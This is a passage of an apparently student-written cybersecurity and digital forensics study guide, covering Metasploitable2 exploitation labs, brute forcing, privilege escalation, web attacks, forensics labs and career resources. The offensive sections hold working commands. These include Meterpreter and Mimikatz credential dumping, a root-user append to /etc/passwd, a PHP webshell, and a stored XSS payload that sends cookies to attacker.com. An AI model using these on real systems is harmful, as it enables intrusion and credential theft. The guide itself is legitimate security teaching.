# LAB 4: Apache Tomcat (Port 8080)
# ═══════════════════════════════════════
# Default credentials: tomcat/tomcat
# Browse to: http://192.168.56.101:8080/manager/html
msf6> use exploit/multi/http/tomcat_mgr_upload
msf6> set RHOSTS 192.168.56.101
msf6> set RPORT 8080
msf6> set HttpUsername tomcat
msf6> set HttpPassword tomcat
msf6> exploit

# ══════════════════════════════════════════
# LAB 5: PostgreSQL Login (Port 5432)
# ══════════════════════════════════════════
# Default: postgres/postgres
msf6> use auxiliary/scanner/postgres/postgres_login
msf6> set RHOSTS 192.168.56.101
msf6> run

# Execute commands via PostgreSQL
msf6> use exploit/multi/postgres/postgres_copy_from_program
msf6> set RHOSTS 192.168.56.101
msf6> set USERNAME postgres
msf6> set PASSWORD postgres
msf6> exploit

# ════════════════════════════════════════
# LAB 6: Web Vulnerabilities (Port 80)
# ════════════════════════════════════════
# DVWA: http://192.168.56.101/dvwa/
# Mutillidae: http://192.168.56.101/mutillidae/
# phpMyAdmin: http://192.168.56.101/phpMyAdmin/
# Tikiwiki: http://192.168.56.101/tikiwiki/

# DVWA SQL Injection Lab:
# Set security to LOW in DVWA settings
# Go to SQL Injection
# Enter: ' OR '1'='1
# Enter: ' UNION SELECT null, table_name FROM information_schema.tables--

# ══════════════════════════════════════
# LAB 7: SSH Brute Force (Port 22)
# ══════════════════════════════════════
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

# Medusa
medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ssh

# ═════════════════════════════════════
# LAB 8: Post-Exploitation
# ═════════════════════════════════════
# After getting Meterpreter session:
meterpreter> sysinfo          # System info
meterpreter> getuid            # Current user
meterpreter> getsystem         # Privilege escalation
meterpreter> hashdump          # Dump password hashes
meterpreter> run post/linux/gather/hashdump
meterpreter> run post/multi/gather/env     # Environment variables
meterpreter> upload /path/to/file /tmp/    # Upload file
meterpreter> download /etc/passwd /local/  # Download file
meterpreter> shell             # Get shell
```

### 23.5 Password Attacks

```bash
# Hydra - network login brute forcer
sudo apt install hydra

# SSH brute force (your test systems only)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

# HTTP form brute force
hydra -l admin -P wordlist.txt 192.168.56.101 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# FTP brute force
hydra -l ftp -P wordlist.txt ftp://192.168.56.101

# WordPress login brute force (your WP site)
wpscan --url http://yourwordpress.com --passwords wordlist.txt --usernames admin

# Spray attack (one password, many users)
hydra -L users.txt -p "Password123!" ssh://192.168.56.101

# Offline hash cracking
# Get hashes from /etc/shadow (own system):
sudo cat /etc/shadow | grep -v "!" | grep -v "*"

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt
john --show shadow_hashes.txt

# Crack with Hashcat
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt  # sha512crypt
hashcat -m 500 shadow_hashes.txt /usr/share/wordlists/rockyou.txt   # md5crypt
```

### 23.6 Privilege Escalation (Linux)

```bash
# ════════════════════════════════════
# On your own Linux system or VM
# ════════════════════════════════════

# Check current user and groups
id
whoami
groups

# Find SUID binaries (can run as root)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# Check sudo permissions
sudo -l

# Check crontab for writable scripts
cat /etc/crontab
crontab -l

# Check for world-writable cron scripts
ls -la /etc/cron*

# Check kernel version (kernel exploits)
uname -a
lsb_release -a

# LinPEAS - automated privilege escalation check
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# GTFOBins - exploiting sudo/SUID binaries
# https://gtfobins.github.io/

# Example: If 'vim' has sudo permission
sudo vim -c ':!/bin/bash'

# Example: If 'find' has SUID
find . -exec /bin/sh -p \; -quit

# Check for path hijacking
echo $PATH
# Create malicious binary in PATH with same name as script called by root

# Check for writable /etc/passwd
ls -la /etc/passwd
# If writable: add new root user
echo "hacker:$(openssl passwd -1 password):0:0:hacker:/root:/bin/bash" >> /etc/passwd
su hacker
```

### 23.7 Windows Exploitation (Metasploitable2 / Own VMs)

```bash
# MS17-010 EternalBlue (Windows 7, 2008 without patch)
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS TARGET_IP
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST YOUR_IP
msf6> exploit

# After Meterpreter session:
meterpreter> hashdump       # Dump NTLM hashes
meterpreter> load kiwi      # Load Mimikatz
meterpreter> creds_all      # Extract all credentials
meterpreter> lsa_dump_sam   # Dump SAM database
meterpreter> lsa_dump_secrets  # Dump LSA secrets
meterpreter> run post/windows/gather/smart_hashdump

# Pass-the-Hash (PTH)
msf6> use exploit/windows/smb/psexec
msf6> set SMBUser Administrator
msf6> set SMBPass "HASH_HERE" # Use NTLM hash directly
msf6> exploit
```

### 23.8 Testing Your Own Web Applications

As a software engineer, test these on your own created websites:

```bash
# Your website: http://yourwebsite.local (or localhost)

# 1. SQL Injection Tests
# Add to your web app: php file with vulnerable code:
# $query = "SELECT * FROM users WHERE id = " . $_GET['id'];

# Test manually:
curl "http://localhost/vuln.php?id=1 OR 1=1"
curl "http://localhost/vuln.php?id=1 UNION SELECT null,user(),version()--"

# Automate with sqlmap:
sqlmap -u "http://localhost/vuln.php?id=1" --level=5 --risk=3

# 2. XSS Tests
# Vulnerable code: echo $_GET['name'];
# Test: http://localhost/page.php?name=<script>alert(1)</script>

# DOM-based XSS
# http://localhost/#<img src=x onerror=alert(1)>

# Stored XSS
curl -X POST http://localhost/comment -d "comment=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"

# 3. CSRF Testing
# Create a malicious HTML page:
cat > csrf_test.html << 'EOF'
<html>
<body>
<form action="http://localhost/admin/delete" method="POST">
    <input type="hidden" name="user_id" value="1">
    <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
EOF

# 4. File Upload Bypass (if your app allows uploads)
# Create PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Rename to bypass filters:
cp shell.php shell.php.jpg  # Double extension
cp shell.php shell.pHP      # Case variation
# Upload and access: http://localhost/uploads/shell.php?cmd=id

# 5. IDOR (Insecure Direct Object Reference)
# Test accessing other users' resources
curl http://localhost/api/user/1/profile  # Your profile
curl http://localhost/api/user/2/profile  # Another user's profile

# 6. SSRF (Server-Side Request Forgery)
curl "http://localhost/fetch?url=http://localhost/admin"
curl "http://localhost/fetch?url=file:///etc/passwd"
curl "http://localhost/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata
```

---

## 24. Full Lab Environment Setup

### 24.1 Host Machine Requirements

```
Minimum specs:
- RAM: 16GB (32GB recommended)
- CPU: 4+ cores
- Storage: 500GB+ SSD
- OS: Kali Linux / Ubuntu / Parrot OS
```

### 24.2 VirtualBox/VMware Network Setup

```
Network Configurations:
├── NAT → VMs access internet through host
├── Host-Only → VMs talk to each other + host (isolated)
├── Bridged → VMs get IP from router (real network)
└── Internal → VMs only talk to each other (most isolated)

Recommended lab setup:
┌─────────────────────────────────────────┐
│   Host Machine (Kali Linux)             │
│   ┌─────────────────────────────────┐  │
│   │   VirtualBox / VMware           │  │
│   │   ┌───────────┐ ┌───────────┐  │  │
│   │   │Kali/Parrot│ │Metasploit │  │  │
│   │   │(Attacker) │ │   able2   │  │  │
│   │   │           │ │(Target)   │  │  │
│   │   └───────────┘ └───────────┘  │  │
│   │         Host-Only Network       │  │
│   └─────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

### 24.3 Full Lab Installation Script

```bash
#!/bin/bash
# Complete Cybersecurity Lab Setup Script for Kali Linux

echo "=== Cybersecurity Lab Setup ==="

# Update system
sudo apt update && sudo apt upgrade -y

# Core forensics tools
sudo apt install -y \
    autopsy \
    sleuthkit \
    foremost \
    scalpel \
    binwalk \
    exiftool \
    steghide \
    stegdetect \
    testdisk \
    photorec \
    dcfldd \
    ewf-tools \
    afflib-tools

# Memory forensics
pip3 install volatility3
pip3 install yara-python

# Network forensics
sudo apt install -y \
    wireshark \
    tshark \
    tcpdump \
    snort \
    suricata \
    ngrep \
    networkMiner \
    zeek

# Hacking tools
sudo apt install -y \
    nmap \
    metasploit-framework \
    burpsuite \
    nikto \
    sqlmap \
    hydra \
    john \
    hashcat \
    gobuster \
    ffuf \
    wfuzz \
    aircrack-ng \
    ettercap-common \
    bettercap

# OSINT tools
sudo apt install -y \
    maltego \
    theharvester \
    recon-ng \
    dmitry

# Wordlists
sudo apt install -y wordlists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists (comprehensive wordlists)
cd /opt
sudo git clone https://github.com/danielmiessler/SecLists.git

# Web application testing
sudo apt install -y \
    zaproxy \
    wpscan \
    dirb \
    skipfish

# Exploitation frameworks
sudo apt install -y \
    beef-xss \
    powersploit

# Password tools
sudo apt install -y \
    hashid \
    hash-identifier \
    crunch \
    cewl

# Additional forensic tools
pip3 install --break-system-packages \
    python-evtx \
    dissect \
    analyzeMFT

# YARA
sudo apt install -y yara
pip3 install yara-python

# Ghidra (manual install)
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip
unzip ghidra_*.zip -d /opt/
echo "alias ghidra='/opt/ghidra_10.4_PUBLIC/ghidraRun'" >> ~/.bashrc

# Radare2
sudo apt install -y radare2

# ClamAV (antivirus for comparison)
sudo apt install -y clamav
sudo freshclam

# pwndbg (debugging enhancement)
git clone https://github.com/pwndbg/pwndbg /opt/pwndbg
cd /opt/pwndbg && ./setup.sh

echo "=== Lab setup complete! ==="
echo "Reboot recommended"
```

### 24.4 Setting Up Vulnerable Web Applications

```bash
# DVWA (Damn Vulnerable Web Application)
sudo apt install -y apache2 php mysql-server php-mysql

# Clone DVWA
cd /var/www/html/
sudo git clone https://github.com/digininja/DVWA.git

# Configure
sudo cp DVWA/config/config.inc.php.dist DVWA/config/config.inc.php
sudo nano DVWA/config/config.inc.php
# Set: $_DVWA['db_password'] = 'p@ssw0rd';

# Setup database
sudo mysql -u root << 'EOF'
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EOF

sudo systemctl restart apache2

# Access: http://localhost/DVWA/setup.php
# Click "Create / Reset Database"

# ─────────────────────────────────────────

# WebGoat (Java-based)
docker run -d -p 8080:8080 -p 9090:9090 --name webgoat webgoat/webgoat
# Access: http://localhost:8080/WebGoat/login

# ─────────────────────────────────────────

# Juice Shop (Node.js-based, OWASP)
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
# Access: http://localhost:3000

# ─────────────────────────────────────────

# bWAPP
cd /var/www/html/
sudo git clone https://github.com/raesene/bWAPP.git
# Follow setup at http://localhost/bWAPP/install.php

# ─────────────────────────────────────────

# Mutillidae
sudo apt install -y mutillidae
# Access: http://localhost/mutillidae/
```

---

## 25. Practical Labs

### Lab 1: Complete Disk Forensics Lab

```bash
#!/bin/bash
# Lab 1: Full Disk Forensics Workflow

echo "=== LAB 1: Disk Forensics ==="

# Create a test disk image with known data
dd if=/dev/urandom of=/tmp/test_disk.img bs=1M count=50 2>/dev/null

# Format as FAT32
mkfs.fat -F 32 /tmp/test_disk.img

# Mount and add test files
sudo mkdir -p /tmp/test_mount
sudo mount -o loop /tmp/test_disk.img /tmp/test_mount

# Create test files
echo "SECRET DATA - Do not delete" | sudo tee /tmp/test_mount/secret.txt
echo "Password: admin123" | sudo tee /tmp/test_mount/passwords.txt
sudo mkdir /tmp/test_mount/documents
echo "Confidential report" | sudo tee /tmp/test_mount/documents/report.txt

# "Delete" files to practice recovery
sudo rm /tmp/test_mount/secret.txt
sudo rm /tmp/test_mount/passwords.txt

# Unmount
sudo umount /tmp/test_mount

echo "Test disk created with deleted files"
echo ""
echo "Now recovering files..."

# Take hash before analysis
md5sum /tmp/test_disk.img

# Recover with foremost
sudo foremost -i /tmp/test_disk.img -o /tmp/recovered_foremost/ -v

# Recover with photorec
# sudo photorec /tmp/test_disk.img  # Interactive

# View recovered files
ls -la /tmp/recovered_foremost/

echo "=== Lab 1 Complete ==="
```

### Lab 2: Memory Forensics Lab

```bash
#!/bin/bash
# Lab 2: Memory Forensics

echo "=== LAB 2: Memory Forensics ==="

# Install LiME for memory capture
# (Only needed if capturing real memory)
# sudo apt install linux-headers-$(uname -r)
# git clone https://github.com/504ensicsLabs/LiME
# cd LiME/src && make

# For lab, download a sample memory dump
# wget https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples

# Using Volatility3 with sample file
# vol.py -f memory.dmp --profile=WinXPSP3x86 windows.pslist

# Linux memory analysis (if you capture your own)
cat > memory_analysis.sh << 'SCRIPT'
#!/bin/bash
MEMFILE="$1"
echo "=== Memory Analysis of: $MEMFILE ==="

# Basic info
echo -e "\n[+] System Info:"
vol.py -f "$MEMFILE" windows.info 2>/dev/null || \
vol.py -f "$MEMFILE" linux.info 2>/dev/null

# Running processes
echo -e "\n[+] Running Processes:"
vol.py -f "$MEMFILE" windows.pslist 2>/dev/null | head -30

# Network connections
echo -e "\n[+] Network Connections:"
vol.py -f "$MEMFILE" windows.netstat 2>/dev/null | head -20

# Suspicious processes
echo -e "\n[+] Suspicious Memory Regions (Malfind):"
vol.py -f "$MEMFILE" windows.malfind 2>/dev/null | head -50

# Command history
echo -e "\n[+] Command History:"
vol.py -f "$MEMFILE" windows.cmdline 2>/dev/null | head -30
SCRIPT

chmod +x memory_analysis.sh

echo "Memory analysis script created: memory_analysis.sh"
echo "Usage: ./memory_analysis.sh memory.dmp"
```

### Lab 3: Network Forensics Lab

```bash
#!/bin/bash
# Lab 3: Network Forensics

echo "=== LAB 3: Network Forensics ==="

# Generate sample traffic for analysis
# Start a simple HTTP server on your system
python3 -m http.server 8888 &
SERVER_PID=$!

# Capture traffic while accessing it
sudo tcpdump -i lo -w /tmp/lab_traffic.pcap -c 100 &
TCPDUMP_PID=$!

# Generate traffic
for i in {1..5}; do
    curl -s http://localhost:8888/ > /dev/null
    wget -q -O /dev/null http://localhost:8888/
    sleep 1
done

# Stop capture
kill $SERVER_PID $TCPDUMP_PID 2>/dev/null
wait

echo -e "\n[+] Captured packets: $(tshark -r /tmp/lab_traffic.pcap 2>/dev/null | wc -l)"

# Analysis
echo -e "\n[+] Protocol Distribution:"
tshark -r /tmp/lab_traffic.pcap -q -z io,phs 2>/dev/null

echo -e "\n[+] HTTP Requests:"
tshark -r /tmp/lab_traffic.pcap -Y "http.request" -T fields \
    -e ip.src -e ip.dst -e http.request.method -e http.request.uri 2>/dev/null

echo -e "\n[+] Unique Connections:"
tshark -r /tmp/lab_traffic.pcap -T fields -e ip.src -e ip.dst 2>/dev/null | \
    sort -u | head -20

echo "=== Lab 3 Complete ==="
```

### Lab 4: Web Application Testing Lab (Your Own Site)

```bash
#!/bin/bash
# Lab 4: Web Application Security Testing
# ONLY ON YOUR OWN APPLICATIONS

TARGET="http://localhost"  # Change to your app

echo "=== LAB 4: Web Application Testing ==="

# 1. Technology fingerprinting
echo -e "\n[+] Technology Fingerprinting:"
whatweb "$TARGET"
curl -I "$TARGET" 2>/dev/null | grep -E "Server:|X-Powered-By:|X-Generator:"

# 2. Directory enumeration
echo -e "\n[+] Directory Enumeration:"
gobuster dir -u "$TARGET" \
    -w /usr/share/wordlists/dirb/common.txt \
    -q 2>/dev/null | head -20

# 3. Nikto scan
echo -e "\n[+] Nikto Vulnerability Scan:"
nikto -h "$TARGET" -nointeractive 2>/dev/null | head -30

# 4. Check common misconfigurations
echo -e "\n[+] Common Files Check:"
for file in robots.txt sitemap.xml .git/config .env composer.json package.json config.php wp-config.php; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
    if [ "$status" = "200" ]; then
        echo "  [FOUND] $TARGET/$file (HTTP $status)"
    fi
done

# 5. HTTP Headers check
echo -e "\n[+] Security Headers Check:"
headers=$(curl -I -s "$TARGET")
for header in "X-Frame-Options" "X-XSS-Protection" "Content-Security-Policy" "Strict-Transport-Security" "X-Content-Type-Options"; do
    if echo "$headers" | grep -qi "$header"; then
        echo "  [OK] $header present"
    else
        echo "  [MISSING] $header"
    fi
done

echo "=== Lab 4 Complete ==="
```

### Lab 5: Malware Analysis Lab

```bash
#!/bin/bash
# Lab 5: Static Malware Analysis (safe samples)

echo "=== LAB 5: Malware Analysis ==="

# Download EICAR test file (harmless antivirus test)
wget -O /tmp/eicar_test.com 'https://www.eicar.org/download/eicar.com'

# Or create it manually:
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar_test.com

echo "[+] Analyzing sample file..."

# File type
echo -e "\n[1] File Type:"
file /tmp/eicar_test.com

# Hash
echo -e "\n[2] Hashes:"
md5sum /tmp/eicar_test.com
sha256sum /tmp/eicar_test.com

# Strings
echo -e "\n[3] Interesting Strings:"
strings /tmp/eicar_test.com

# Entropy (simulate with python)
python3 -c "
import math
data = open('/tmp/eicar_test.com', 'rb').read()
if not data:
    print('Empty file')
else:
    freq = [data.count(bytes([i]))/len(data) for i in range(256)]
    entropy = -sum(p * math.log2(p) for p in freq if p > 0)
    print(f'File Entropy: {entropy:.2f}/8.0')
    if entropy > 7.0:
        print('HIGH ENTROPY - possibly packed/encrypted')
    elif entropy > 6.0:
        print('MEDIUM ENTROPY - possibly compressed')
    else:
        print('LOW ENTROPY - likely plain text/code')
"

# YARA scan with sample rules
cat > /tmp/test_yara.yar << 'EOF'
rule EICAR_Test {
    meta:
        description = "EICAR antivirus test file"
    strings:
        $s = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" ascii
    condition:
        $s
}
EOF

echo -e "\n[4] YARA Results:"
yara /tmp/test_yara.yar /tmp/eicar_test.com

echo "=== Lab 5 Complete ==="
```

---

## 26. Building a Forensic Report

### 26.1 Report Template (Markdown)

```markdown
# DIGITAL FORENSICS INVESTIGATION REPORT

**CONFIDENTIAL**

---

## Case Information

| Field            | Details                    |
| ---------------- | -------------------------- |
| **Case Number**  | CASE-2024-001              |
| **Report Date**  | 2024-01-15                 |
| **Examiner**     | Your Name                  |
| **Organization** | Your University/Department |
| **Evidence ID**  | EV-001, EV-002             |

---

## Executive Summary

[1-2 paragraph non-technical summary of what happened,
what was found, and what action should be taken]

---

## Methodology

### Tools Used

- Autopsy 4.21 — file analysis and recovery
- Wireshark 4.0 — network packet analysis
- Volatility 3 — memory forensics
- ExifTool 12.6 — metadata extraction
- Foremost 1.5.7 — file carving

### Process

1. Evidence received and hashed
2. Forensic image created
3. Analysis performed on image copy
4. Findings documented

---

## Evidence

### EV-001: USB Drive

- **SHA256:** [hash value]
- **Size:** 32GB
- **File System:** NTFS
- **Date Received:** 2024-01-10
- **Condition:** Functional, partial corruption in sectors 1024-2048

---

## Findings

### Finding 1: Deleted Files Recovered

**Description:** 47 files were recovered from unallocated space.

**Details:**

- 23 JPEG images
- 15 PDF documents
- 9 DOCX files

**Significance:** [Explain legal/investigative relevance]

---

## Timeline

| Date/Time        | Event                   | Evidence     |
| ---------------- | ----------------------- | ------------ |
| 2024-01-01 09:00 | USB connected to system | Event log    |
| 2024-01-01 09:15 | Files copied to USB     | NTFS journal |
| 2024-01-01 09:30 | Files deleted           | $Recycle.Bin |

---

## Conclusions

[Based on evidence and analysis, conclude what happened]

---

## Recommendations

1. Implement endpoint DLP (Data Loss Prevention)
2. Enable USB port restrictions via Group Policy
3. Maintain 90-day log retention
4. Conduct quarterly security audits

---

## Appendix

### A. Hash Verification

| File       | SHA256 |
| ---------- | ------ |
| EV-001.e01 | [hash] |

### B. Chain of Custody Log

[Attach chain of custody document]
```

### 26.2 Generate PDF Report

```bash
# Install pandoc for MD to PDF conversion
sudo apt install pandoc texlive-full

# Convert markdown report to PDF
pandoc forensic_report.md \
    --pdf-engine=xelatex \
    -V geometry:margin=1in \
    -V fontsize=11pt \
    -o forensic_report.pdf

# Or use Python to generate HTML report
python3 << 'EOF'
import subprocess
import datetime

report_content = """
# Digital Forensics Report
**Date:** {date}
**Examiner:** Your Name

## Findings
...
""".format(date=datetime.datetime.now().strftime("%Y-%m-%d"))

with open("report.md", "w") as f:
    f.write(report_content)

subprocess.run(["pandoc", "report.md", "-o", "report.pdf"])
print("Report generated: report.pdf")
EOF
```

---

## 27. Portfolio Building & Career Path

### 27.1 Creating Your Security Portfolio

```
Portfolio Structure:
├── GitHub Profile
│   ├── forensics-lab (your lab scripts)
│   ├── ctf-writeups (competition solutions)
│   ├── security-tools (tools you've built)
│   └── vulnerability-research (your findings)
├── Personal Blog/Website
│   ├── Case study writeups
│   ├── Tool tutorials
│   └── Research articles
└── LinkedIn Profile
    ├── Certifications
    ├── Projects
    └── Skills
```

### 27.2 Practice Platforms

| Platform           | URL                 | Focus               |
| ------------------ | ------------------- | ------------------- |
| **HackTheBox**     | hackthebox.com      | Penetration testing |
| **TryHackMe**      | tryhackme.com       | Beginner-friendly   |
| **CTFtime**        | ctftime.org         | CTF competitions    |
| **VulnHub**        | vulnhub.com         | Vulnerable VMs      |
| **DFIR.training**  | dfir.training       | Forensics labs      |
| **CyberDefenders** | cyberdefenders.org  | Blue team/forensics |
| **BlueTeamLabs**   | blueteamlabs.online | Defensive security  |
| **Root-Me**        | root-me.org         | Various challenges  |

### 27.3 Certifications Roadmap

```
BEGINNER
├── CompTIA Security+
├── CompTIA CySA+ (Cybersecurity Analyst)
└── eJPT (eLearnSecurity Junior Penetration Tester)

INTERMEDIATE
├── CEH (Certified Ethical Hacker)
├── CHFI (Computer Hacking Forensic Investigator)
├── eCDFP (eLearnSecurity Certified Digital Forensics Professional)
└── GCFE (GIAC Certified Forensic Examiner)

ADVANCED
├── OSCP (Offensive Security Certified Professional)
├── GCFA (GIAC Certified Forensic Analyst)
├── EnCE (EnCase Certified Examiner)
└── CISSP (Certified Information Systems Security Professional)
```

---

## 28. Future Trends

### 28.1 AI in Digital Forensics

**Positive impacts:**

- Automated evidence collection and classification
- AI-powered malware detection
- Faster large-dataset analysis (petabyte-scale)
- Predictive analysis — reconstructing deleted data patterns

**Negative impacts:**

- AI-powered anti-forensic tools
- Deepfakes as evidence (image/video manipulation)
- Privacy concerns with AI training data

```python
# Example: Simple ML-based malware classifier
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
import numpy as np

# Feature: strings from PE files
benign_strings = [
    "kernel32.dll CreateFile GetFileSize",
    "user32.dll MessageBox ShowWindow",
]
malware_strings = [
    "WSAStartup connect recv send CreateRemoteThread",
    "RegSetValueEx HKEY_RUN VirtualAlloc WriteProcessMemory",
]

X = benign_strings + malware_strings
y = [0, 0, 1, 1]  # 0=benign, 1=malware

vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X)

clf = RandomForestClassifier()
clf.fit(X_vec, y)

# Test new sample
new_sample = ["CreateRemoteThread VirtualAlloc encrypt files"]
prediction = clf.predict(vectorizer.transform(new_sample))
print("Prediction:", "MALWARE" if prediction[0] else "BENIGN")
```

### 28.2 Blockchain Forensics

```bash
# Bitcoin transaction analysis
# Install bitcoin tools
sudo apt install bitcoin

# Analyze blockchain data
bitcoin-cli getblock BLOCK_HASH

# Chain analysis tools:
# - Chainalysis (commercial)
# - Elliptic (commercial)
# - OSINT tools for public blockchain analysis

# Ethereum forensics
# Install web3
pip3 install web3

python3 << 'EOF'
from web3 import Web3

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_KEY'))

# Trace a transaction
tx_hash = "0x..."
tx = w3.eth.get_transaction(tx_hash)
receipt = w3.eth.get_transaction_receipt(tx_hash)

print(f"From: {tx['from']}")
print(f"To: {tx['to']}")
print(f"Value: {w3.from_wei(tx['value'], 'ether')} ETH")
print(f"Block: {tx['blockNumber']}")
EOF
```

### 28.3 IoT Forensics

```bash
# Analyze IoT device firmware
binwalk firmware.bin                    # Detect file types
binwalk -e firmware.bin                 # Extract contents
binwalk -A firmware.bin                 # Find architecture

# If filesystem extracted:
ls extracted/
strings extracted/bin/sh | grep "password\|key\|secret"

# MQTT protocol analysis (common IoT protocol)
sudo apt install mosquitto-clients
mosquitto_sub -h iot_device_ip -t "#" -v  # Subscribe to all topics

# CoAP protocol (IoT)
sudo apt install libcoap-dev

# Zigbee/Z-Wave sniffing
# Requires hardware: HackRF, RTL-SDR, or dedicated sniffers
```

---

## 29. Recommended Books & Resources

### 29.1 Essential Books

| Book                                         | Author                          | Focus                |
| -------------------------------------------- | ------------------------------- | -------------------- |
| **The Art of Memory Forensics**              | Ligh, Case, Levy, Walters       | Memory forensics     |
| **Digital Forensics with Open Source Tools** | Altheide, Carvey                | Open-source tools    |
| **File System Forensic Analysis**            | Brian Carrier                   | Filesystem internals |
| **Malware Analyst's Cookbook**               | Ligh, Adair, Hartstein, Richard | Malware analysis     |
| **The Web Application Hacker's Handbook**    | Stuttard, Pinto                 | Web security         |
| **Penetration Testing**                      | Georgia Weidman                 | Pentesting           |
| **Hacking: The Art of Exploitation**         | Jon Erickson                    | Low-level hacking    |
| **Blue Team Handbook**                       | Don Murdoch                     | Incident response    |

### 29.2 Online Resources

```
Forensics:
- https://www.forensicswiki.org
- https://github.com/meirwah/awesome-incident-response
- https://github.com/cugu/awesome-forensics
- https://dfir.training (lab exercises)

Security:
- https://portswigger.net/web-security (free web security training)
- https://pentesterlab.com
- https://www.hackthebox.com
- https://owasp.org

CTF Resources:
- https://ctftime.org
- https://github.com/ctfs/write-ups-2024

Tools:
- https://github.com/volatilityfoundation/volatility3
- https://github.com/VirusTotal/yara
- https://www.wireshark.org/docs/
```

### 29.3 Study Plan (6 Months)

```
Month 1: Foundations
   Week 1-2: Digital Forensics Theory (Sections 1-3)
   Week 3-4: File Systems (Section 4)

Month 2: Core Skills
   Week 1-2: Data Recovery (Section 5)
   Week 3-4: Tools Practice (Section 6)

Month 3: Specialized Forensics
   Week 1: Network Forensics (Section 7)
   Week 2: Mobile Forensics (Section 8)
   Week 3: Cloud Forensics (Section 9)
   Week 4: Malware Analysis (Section 10)

Month 4: Offensive Security
   Week 1-2: Reconnaissance & Scanning (Section 23.1-23.2)
   Week 3-4: Exploitation Labs - Metasploitable2 (Section 23.4)

Month 5: Advanced Labs
   Week 1-2: Web Application Testing on own sites (Section 23.8)
   Week 3-4: Complete all practical labs (Section 25)

Month 6: Portfolio & Certifications
   Week 1-2: Build portfolio + CTF participation
   Week 3-4: Practice reports + prepare for certifications
```

---

## 📝 Quick Reference Card

```
FORENSIC HASHES:
md5sum file          sha256sum file

DISK IMAGING:
dd if=/dev/sdb of=image.img bs=4096

MOUNT IMAGE:
sudo mount -o ro,loop image.img /mnt/

FILE CARVING:
foremost -i image.img -o /output/
photorec image.img

MEMORY FORENSICS:
vol.py -f memory.dmp windows.pslist

NETWORK CAPTURE:
sudo tcpdump -i eth0 -w capture.pcap

PACKET ANALYSIS:
tshark -r capture.pcap -Y "http"

METADATA:
exiftool image.jpg

STEGANOGRAPHY:
steghide info image.jpg
binwalk image.jpg

HASH CRACK:
hashcat -m 0 hash.txt wordlist.txt

PORT SCAN:
nmap -sV -A target_ip

WEB SCAN:
nikto -h http://target
gobuster dir -u http://target -w wordlist.txt

SQL INJECTION:
sqlmap -u "http://target/page?id=1" --dbs

METASPLOIT:
msfconsole
use exploit/...
set RHOSTS target
exploit
```

---

_This guide is for educational purposes for cybersecurity students. Always practice on systems you own or have explicit permission to test. Never use these techniques on unauthorized systems._

**Author:** Cybersecurity Department Student
**Last Updated:** 2024
**Version:** 1.0
